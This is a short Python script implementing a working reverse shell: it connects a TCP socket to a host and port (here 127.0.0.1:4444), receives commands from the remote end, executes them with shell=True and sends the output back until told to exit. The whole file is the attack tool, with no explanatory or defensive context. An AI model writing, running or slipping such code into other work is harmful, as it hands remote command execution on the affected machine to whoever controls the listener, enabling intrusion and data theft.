import socket
import subprocess

def reverse_shell(host, port):
    try:
        # Create a socket object
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))

        while True:
            # Receive command from the server
            command = s.recv(1024).decode()
            if command.lower() == "exit":
                break
            try:
                # Execute the command
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            except subprocess.CalledProcessError as e:
                output = str(e).encode()
            # Send command output back to the server
            s.send(output)
    except Exception as e:
        print(f"Error: {e}")
    finally:
        s.close()

# Configure the target server
reverse_shell("127.0.0.1", 4444)
